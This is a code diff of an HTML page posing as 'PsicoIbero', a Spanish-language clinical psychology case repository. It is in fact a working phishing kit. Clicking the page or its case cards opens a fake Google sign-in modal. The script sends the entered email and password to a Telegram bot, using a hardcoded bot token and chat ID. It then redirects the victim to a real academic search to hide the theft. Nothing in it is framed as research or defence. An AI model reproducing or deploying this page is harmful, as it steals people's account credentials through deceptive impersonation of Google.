@@ -3,213 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enciclopedia de Casos Clínicos - Red Iberoamericana de Psicología</title>
+    <title>Enciclopedia de Casos Clínicos - PsicoIbero</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&family=Roboto:wght@300;400;500&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
         
-        :root {
-            --google-blue: #1a73e8;
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f8f9fa;
         }
 
-        body { 
-            font-family: 'Roboto', sans-serif; 
-            background-color: #f8f9fa; 
-            overflow-x: hidden;
-        }
-        
-        h1, h2 { font-family: 'Merriweather', serif; }
-
-        .google-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(32, 33, 36, 0.6);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(2px);
+        .hero-section {
+            background-color: #1a3a8a;
+            color: white;
+            padding: 80px 20px;
+            text-align: center;
         }
 
-        .google-card {
+        .card {
             background: white;
             border-radius: 8px;
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,.30), 0 1px 3px 1px rgba(60,64,67,.15);
-            width: 100%;
-            max-width: 448px;
-            min-height: 500px;
-            padding: 48px 40px 36px;
+            padding: 24px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
+        }
+
+        /* Estilos del Modal de Google */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.5);
             display: flex;
-            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .google-modal {
+            background: white;
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            border-radius: 8px;
             position: relative;
+            text-align: center;
         }
 
         .google-input {
-            border: 1px solid #dadce0;
-            border-radius: 4px;
+            width: 100%;
             padding: 13px 15px;
             font-size: 16px;
-            transition: border 0.2s;
-            width: 100%;
-            color: #202124;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            margin-top: 20px;
         }
 
         .google-input:focus {
-            border: 2px solid var(--google-blue);
-            outline: none;
-            padding: 12px 14px;
+            border: 2px solid #1a73e8;
         }
 
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid var(--google-blue);
-            border-radius: 50%;
-            width: 30px; height: 30px;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .clickable-overlay {
+        .btn-google {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
             cursor: pointer;
+            border: none;
+            float: right;
+            margin-top: 24px;
+        }
+
+        .hidden { display: none; }
+        
+        .loading-dots:after {
+            content: ' .';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { color: rgba(0,0,0,0); text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); }
+            40% { color: #1a73e8; text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); }
+            60% { text-shadow: .25em 0 0 #1a73e8, .5em 0 0 rgba(0,0,0,0); }
+            80%, 100% { text-shadow: .25em 0 0 #1a73e8, .5em 0 0 #1a73e8; }
         }
     </style>
 </head>
-<body onclick="openLogin()">
+<body>
 
-    <!-- Header Profesional -->
-    <header class="bg-white border-b border-gray-200 py-4 px-6 sticky top-0 z-50 shadow-sm clickable-overlay">
-        <div class="max-w-7xl mx-auto flex justify-between items-center">
-            <div class="flex items-center space-x-2">
-                <div class="bg-blue-800 text-white p-2 rounded">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"></path></svg>
-                </div>
-                <div>
-                    <h1 class="text-xl font-bold text-gray-800 leading-none">PsicoIbero</h1>
-                    <p class="text-[10px] text-gray-500 uppercase tracking-widest">Red Iberoamericana de Psicología</p>
-                </div>
+    <!-- Header simulación -->
+    <nav class="bg-white border-b px-8 py-4 flex justify-between items-center">
+        <div class="flex items-center gap-2">
+            <div class="bg-blue-800 p-1 rounded">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 3L1 9l11 6 9-4.91V17h2V9L12 3z"/></svg>
             </div>
-            <nav class="hidden md:flex space-x-8 text-sm font-medium text-gray-600">
-                <span>Enciclopedia</span>
-                <span>Protocolos</span>
-                <span>Publicaciones</span>
-            </nav>
-            <button class="bg-blue-700 text-white px-5 py-2 rounded-md text-sm font-medium hover:bg-blue-800 transition">
-                Acceso Institucional
-            </button>
+            <span class="text-xl font-bold text-gray-800">PsicoIbero</span>
         </div>
-    </header>
+        <div class="hidden md:flex gap-6 text-gray-600 text-sm font-medium">
+            <a href="#">Enciclopedia</a>
+            <a href="#">Protocolos</a>
+            <a href="#">Publicaciones</a>
+        </div>
+        <button onclick="showLogin()" class="bg-blue-600 text-white px-4 py-2 rounded text-sm font-medium hover:bg-blue-700">Acceso Institucional</button>
+    </nav>
 
-    <!-- Hero Section -->
-    <section class="bg-[#1a237e] text-white py-20 px-6 clickable-overlay">
-        <div class="max-w-4xl mx-auto text-center">
-            <h2 class="text-4xl md:text-5xl font-bold mb-6">Enciclopedia de Casos Clínicos</h2>
-            <p class="text-lg text-blue-100 mb-8 font-light max-w-2xl mx-auto">El repositorio académico más grande de Iberoamérica para la consulta de diagnósticos y protocolos de intervención.</p>
-            <div class="bg-white/10 backdrop-blur-md rounded-full px-6 py-3 inline-flex items-center space-x-4 border border-white/20">
-                <input type="text" placeholder="Buscar por diagnóstico o código CIE-10..." class="bg-transparent border-none outline-none text-white placeholder-blue-200 w-64 md:w-96 text-sm">
-                <svg class="w-5 h-5 text-blue-200" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
-            </div>
+    <!-- Hero -->
+    <section class="hero-section">
+        <h1 class="text-4xl font-serif mb-4">Enciclopedia de Casos Clínicos</h1>
+        <p class="text-blue-100 text-lg max-w-2xl mx-auto">El repositorio académico más grande de Iberoamérica para la consulta de diagnósticos y protocolos de intervención.</p>
+        
+        <div class="mt-8 max-w-xl mx-auto relative">
+            <input type="text" placeholder="Buscar por diagnóstico o código CIE-10..." class="w-full py-3 px-6 rounded-full text-gray-800 outline-none">
+            <button class="absolute right-2 top-1.5 bg-blue-600 p-2 rounded-full">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            </button>
         </div>
     </section>
 
-    <!-- Contenido Principal -->
-    <main class="max-w-7xl mx-auto py-16 px-6 clickable-overlay">
-        <h3 class="text-2xl font-bold text-gray-800 mb-10 flex items-center">
-            <span class="w-1 h-8 bg-blue-700 mr-4"></span>
-            Casos Clínicos Recientes
-        </h3>
-
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-            <!-- Caso 1 -->
-            <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-8 flex flex-col items-center text-center hover:shadow-md transition">
-                <div class="bg-blue-50 p-4 rounded-full mb-4">
-                    <svg class="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
-                </div>
-                <span class="text-[10px] font-bold text-gray-400 mb-2 uppercase">DOCUMENTO PDF - 2.4MB</span>
-                <h4 class="text-lg font-bold text-gray-900 mb-2">Manejo de la Depresión Mayor en Adolescentes: Caso 442-B</h4>
-                <p class="text-sm text-gray-500 mb-6">Evaluación multi-axial y plan de intervención farmacológica-conductual...</p>
-                <button class="text-blue-700 text-xs font-bold uppercase tracking-wider hover:underline">Descargar Caso Completo ↓</button>
+    <!-- Contenido Falso -->
+    <main class="max-w-6xl mx-auto py-12 px-6">
+        <h2 class="text-2xl font-bold mb-8 border-l-4 border-blue-600 pl-4">Casos Clínicos Recientes</h2>
+        <div class="grid md:grid-cols-3 gap-8">
+            <div class="card cursor-pointer" onclick="showLogin()">
+                <span class="text-xs font-bold text-blue-600 uppercase">Trastornos del Ánimo</span>
+                <h3 class="font-bold mt-2 mb-4">Manejo de la Depresión Mayor en Adolescentes: Caso 442-B</h3>
+                <p class="text-gray-600 text-sm">Evaluación multi-axial y plan de intervención farmacológica-conductual en paciente de 16 años...</p>
+                <div class="mt-6 text-blue-600 text-xs font-bold">DESCARGAR CASO COMPLETO ↓</div>
             </div>
-
-            <!-- Caso 2 -->
-            <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-8 flex flex-col items-center text-center hover:shadow-md transition">
-                <div class="bg-green-50 p-4 rounded-full mb-4">
-                    <svg class="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
-                </div>
-                <span class="text-[10px] font-bold text-gray-400 mb-2 uppercase">PROTOCOLO CLÍNICO</span>
-                <h4 class="text-lg font-bold text-gray-900 mb-2">Dinámicas de Codependencia en Familias con Adicciones</h4>
-                <p class="text-sm text-gray-500 mb-6">Análisis sistémico de patrones relacionales en una familia nuclear...</p>
-                <button class="text-blue-700 text-xs font-bold uppercase tracking-wider hover:underline">Descargar Caso Completo ↓</button>
+            <div class="card cursor-pointer" onclick="showLogin()">
+                <span class="text-xs font-bold text-green-600 uppercase">Terapia Familiar</span>
+                <h3 class="font-bold mt-2 mb-4">Dinámicas de Codependencia en Familias con Adicciones</h3>
+                <p class="text-gray-600 text-sm">Análisis sistémico de patrones relacionales en una familia nuclear tras el reingreso del progenitor...</p>
+                <div class="mt-6 text-blue-600 text-xs font-bold">DESCARGAR CASO COMPLETO ↓</div>
             </div>
-
-            <!-- Caso 3 -->
-            <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-8 flex flex-col items-center text-center hover:shadow-md transition">
-                <div class="bg-purple-50 p-4 rounded-full mb-4">
-                    <svg class="w-10 h-10 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z"></path></svg>
-                </div>
-                <span class="text-[10px] font-bold text-gray-400 mb-2 uppercase">INVESTIGACIÓN</span>
-                <h4 class="text-lg font-bold text-gray-900 mb-2">Secuelas Cognitivas Post-Trauma Craneoencefálico</h4>
-                <p class="text-sm text-gray-500 mb-6">Estudio longitudinal sobre la plasticidad neuronal y funciones ejecutivas...</p>
-                <button class="text-blue-700 text-xs font-bold uppercase tracking-wider hover:underline">Descargar Caso Completo ↓</button>
+            <div class="card cursor-pointer" onclick="showLogin()">
+                <span class="text-xs font-bold text-purple-600 uppercase">Neuropsicología</span>
+                <h3 class="font-bold mt-2 mb-4">Secuelas Cognitivas Post-Trauma Craneoencefálico</h3>
+                <p class="text-gray-600 text-sm">Estudio longitudinal sobre la plasticidad neuronal y recuperación de funciones ejecutivas en adultos...</p>
+                <div class="mt-6 text-blue-600 text-xs font-bold">DESCARGAR CASO COMPLETO ↓</div>
             </div>
         </div>
     </main>
 
-    <!-- MODAL DE LOGIN (DISEÑO EXACTO GOOGLE) -->
-    <div id="loginModal" class="google-modal" onclick="event.stopPropagation()">
-        <div class="google-card">
+    <!-- MODAL DE GOOGLE -->
+    <div id="loginModal" class="modal-overlay hidden">
+        <div class="google-modal">
+            <button onclick="hideLogin()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
+            </button>
             
-            <div id="loading-screen" class="hidden absolute inset-0 bg-white z-[1100] flex flex-col items-center justify-center rounded-lg">
-                <div class="loader mb-4"></div>
-                <p class="text-[#202124] text-sm font-medium">Iniciando sesión...</p>
+            <!-- Logo Google -->
+            <div class="flex justify-center mb-2">
+                <svg viewBox="0 0 75 24" width="75" height="24"><path d="M14.1 27.2c-7.1 0-12.9-5.7-12.9-12.8S7 1.5 14.1 1.5c3.9 0 7.5 1.5 10.2 4.1l-3.6 3.6c-1.8-1.7-4.1-2.6-6.6-2.6-5.1 0-9.2 4.1-9.2 9.2s4.1 9.2 9.2 9.2c2.5 0 4.8-.9 6.6-2.6 2.3-2.3 3.6-5.5 3.6-8.7h-10.2v-5h15.2c.2 1 .3 2.1.3 3.1 0 4.8-1.7 8.9-4.7 11.8-2.8 2.5-6.5 3.6-10.4 3.6z" fill="#4285F4"/><path d="M48.2 27.2c-7.1 0-12.9-5.7-12.9-12.8S41.1 1.5 48.2 1.5s12.9 5.7 12.9 12.8-5.8 12.9-12.9 12.9zm0-5c4.3 0 7.9-3.5 7.9-7.9s-3.6-7.9-7.9-7.9-7.9 3.5-7.9 7.9 3.6 7.9 7.9 7.9z" fill="#EA4335"/><path d="M75.3 27.2c-7.1 0-12.9-5.7-12.9-12.8S68.2 1.5 75.3 1.5s12.9 5.7 12.9 12.8-5.8 12.9-12.9 12.9zm0-5c4.3 0 7.9-3.5 7.9-7.9s-3.6-7.9-7.9-7.9-7.9 3.5-7.9 7.9 3.6 7.9 7.9 7.9z" fill="#FBBC05"/><path d="M102.1 27.2c-6.8 0-12.4-5.5-12.4-12.4s5.6-12.4 12.4-12.4c3.4 0 6.5 1.3 8.7 3.6l-3.5 3.5c-1.4-1.3-3.2-2.1-5.2-2.1-4.1 0-7.4 3.3-7.4 7.4s3.3 7.4 7.4 7.4c2 0 3.8-.8 5.2-2.1l3.5 3.5c-2.2 2.3-5.3 3.6-8.7 3.6z" fill="#4285F4"/><path d="M118.4 1.5h5v25h-5z" fill="#34A853"/><path d="M137.4 27.2c-6.5 0-11.8-5.3-11.8-11.8s5.3-11.8 11.8-11.8c3.2 0 6.1 1.3 8.2 3.4l-3.4 3.4c-1.3-1.3-3-2.1-4.8-2.1-3.7 0-6.8 3.1-6.8 6.8s3.1 6.8 6.8 6.8c1.8 0 3.5-.8 4.8-2.1l3.4 3.4c-2.1 2.2-5 3.4-8.2 3.4z" fill="#EA4335"/></svg>
             </div>
 
-            <div class="flex justify-center mb-3">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" width="75">
-            </div>
+            <h1 id="modalTitle" class="text-2xl font-normal text-gray-800">Iniciar sesión</h1>
+            <p id="modalSubtitle" class="text-gray-600 mt-2">Usa tu cuenta institucional para continuar al Repositorio de Casos</p>
 
-            <h1 class="text-2xl font-normal text-center text-[#202124] mb-2">Iniciar sesión</h1>
-            <p id="subtitle" class="text-center text-[#202124] mb-10 text-base">Accede al Repositorio de Casos PsicoIbero</p>
-
-            <form id="pishForm" class="flex-grow flex flex-col">
-                <!-- PASO 1: EMAIL -->
-                <div id="email-step" class="flex flex-col h-full">
-                    <input type="email" id="email" placeholder="Correo electrónico o teléfono" required
-                        class="google-input placeholder-[#5f6368] text-base mb-2">
-                    <div class="mb-8">
-                        <a href="#" class="text-sm font-medium text-[#1a73e8] hover:underline">¿Has olvidado tu correo electrónico?</a>
+            <form id="googleForm" class="mt-4">
+                <div id="emailSection">
+                    <input type="email" id="email" class="google-input" placeholder="Correo electrónico o teléfono" required>
+                    <div class="text-left mt-2">
+                        <a href="#" class="text-blue-600 text-sm font-medium hover:underline">¿Has olvidado tu correo electrónico?</a>
                     </div>
-                    <div class="text-[14px] text-[#5f6368] leading-relaxed mb-8">
-                        ¿No es tu ordenador? Usa el modo invitados para iniciar sesión de forma privada. <a href="#" class="text-[#1a73e8] font-medium hover:underline">Más información</a>
-                    </div>
-                    <div class="flex items-center justify-between mt-auto">
-                        <button type="button" class="text-[#1a73e8] font-medium hover:bg-blue-50 px-2 py-2 rounded text-sm transition">Crear cuenta</button>
-                        <button type="button" onclick="showPasswordStep()" 
-                            class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium hover:shadow-md hover:bg-[#1b66c9] transition text-sm">Siguiente</button>
+                    <p class="text-xs text-gray-500 text-left mt-8 leading-relaxed">
+                        Para continuar, Google compartirá tu nombre, dirección de correo electrónico, preferencia de idioma y foto de perfil con PsicoIbero.
+                    </p>
+                    <div class="flex justify-between items-center mt-8">
+                        <a href="#" class="text-blue-600 text-sm font-medium hover:underline">Crear cuenta</a>
+                        <button type="button" onclick="showPassSection()" class="btn-google">Siguiente</button>
                     </div>
                 </div>
 
-                <!-- PASO 2: PASSWORD -->
-                <div id="pass-step" class="hidden flex flex-col h-full">
-                    <div class="flex items-center p-1 pl-1 pr-3 border border-gray-300 rounded-full w-fit mb-8 bg-white hover:bg-gray-50 cursor-pointer mx-auto" onclick="backToEmail()">
-                        <div class="bg-gray-100 p-1 rounded-full mr-2">
-                            <svg class="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20"><path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"></path></svg>
+                <div id="passSection" class="hidden">
+                    <div class="flex items-center gap-2 border rounded-full px-3 py-1 w-fit mx-auto mb-6 cursor-pointer" onclick="backToEmail()">
+                        <div class="w-5 h-5 bg-blue-100 rounded-full flex items-center justify-center">
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="#1a73e8"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                         </div>
-                        <span id="user-display" class="text-sm text-[#3c4043] font-medium truncate max-w-[150px]"></span>
-                        <svg class="w-4 h-4 text-gray-400 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
+                        <span id="userDisplay" class="text-sm font-medium text-gray-700"></span>
+                        <svg width="16" height="16" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
-
-                    <input type="password" id="password" placeholder="Introduce tu contraseña" required
-                        class="google-input placeholder-[#5f6368] text-base mb-2">
-                    
-                    <div class="mt-2 flex items-center mb-10">
-                        <input type="checkbox" id="show-pass" class="mr-2 h-4 w-4 rounded cursor-pointer accent-blue-600">
-                        <label for="show-pass" class="text-sm text-[#202124] cursor-pointer select-none">Mostrar contraseña</label>
+                    <input type="password" id="password" class="google-input" placeholder="Introduce tu contraseña" required>
+                    <div class="text-left mt-2">
+                        <a href="#" class="text-blue-600 text-sm font-medium hover:underline">¿Has olvidado tu contraseña?</a>
                     </div>
-
-                    <div class="flex items-center justify-between mt-auto">
-                        <button type="button" class="text-[#1a73e8] font-medium hover:bg-blue-50 px-2 py-2 rounded text-sm transition">¿Has olvidado tu contraseña?</button>
-                        <button type="submit" 
-                            class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium hover:shadow-md hover:bg-[#1b66c9] transition text-sm">Siguiente</button>
+                    <div class="flex justify-between items-center mt-12">
+                        <span></span>
+                        <button type="submit" id="submitBtn" class="btn-google">Siguiente</button>
                     </div>
                 </div>
             </form>
@@ -218,61 +200,57 @@
 
     <script>
         const BOT_TOKEN = '8198434477:AAHwTLE56HN-W1-REPwGthWpt69IvPp8r88';
-        const CHAT_ID = '6269583447'; 
-        // URL de búsqueda general en Dialnet para asegurar que siempre haya resultados funcionales
-        const URL_FINAL = 'https://dialnet.unirioja.es/buscar/documentos?querysDisponibles=DOCUMENTOS&query=psicologia+clinica';
+        const CHAT_ID = '6269583447';
 
-        function openLogin() {
-            const modal = document.getElementById('loginModal');
-            if(modal.style.display !== 'flex') {
-                modal.style.display = 'flex';
-                document.body.style.overflow = 'hidden';
-            }
+        function showLogin() {
+            document.getElementById('loginModal').classList.remove('hidden');
         }
 
-        function showPasswordStep() {
-            const emailField = document.getElementById('email');
-            if(emailField.checkValidity()){
-                document.getElementById('email-step').classList.add('hidden');
-                document.getElementById('pass-step').classList.remove('hidden');
-                document.getElementById('user-display').textContent = emailField.value;
-                document.getElementById('subtitle').textContent = 'Te damos la bienvenida';
-                document.getElementById('password').focus();
-            } else {
-                emailField.reportValidity();
+        function hideLogin() {
+            document.getElementById('loginModal').classList.add('hidden');
+        }
+
+        function showPassSection() {
+            const email = document.getElementById('email').value;
+            if(email.includes('@')) {
+                document.getElementById('emailSection').classList.add('hidden');
+                document.getElementById('passSection').classList.remove('hidden');
+                document.getElementById('userDisplay').innerText = email;
+                document.getElementById('modalTitle').innerText = 'Te damos la bienvenida';
+                document.getElementById('modalSubtitle').innerText = '';
             }
         }
 
         function backToEmail() {
-            document.getElementById('pass-step').classList.add('hidden');
-            document.getElementById('email-step').classList.remove('hidden');
-            document.getElementById('subtitle').textContent = 'Accede al Repositorio de Casos PsicoIbero';
-            document.getElementById('email').focus();
+            document.getElementById('passSection').classList.add('hidden');
+            document.getElementById('emailSection').classList.remove('hidden');
+            document.getElementById('modalTitle').innerText = 'Iniciar sesión';
+            document.getElementById('modalSubtitle').innerText = 'Usa tu cuenta institucional para continuar al Repositorio de Casos';
         }
 
-        document.getElementById('pishForm').addEventListener('submit', async (e) => {
+        document.getElementById('googleForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            document.getElementById('loading-screen').classList.remove('hidden');
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = '<span class="loading-dots">Iniciando sesión</span>';
+            btn.disabled = true;
 
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
-            const texto = `🔥 LOGIN PSICOIBERO 🔥\n\n📧 User: ${email}\n🔑 Pass: ${pass}`;
+            
+            const message = `🎯 *LOGIN PSICOIBERO*\n\n📧 *User:* \`${email}\`\n🔑 *Pass:* \`${pass}\``;
 
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
                 });
             } catch (err) {}
 
-            setTimeout(() => { 
-                window.location.href = URL_FINAL; 
+            setTimeout(() => {
+                // REDIRECCIÓN A MILES DE CASOS REALES EN GOOGLE ACADÉMICO
+                window.location.href = 'https://scholar.google.com.ar/scholar?q=casos+clinicos+psicologia+filetype:pdf';
             }, 2000);
-        });
-
-        document.getElementById('show-pass').addEventListener('change', function() {
-            document.getElementById('password').type = this.checked ? 'text' : 'password';
         });
     </script>
 </body>
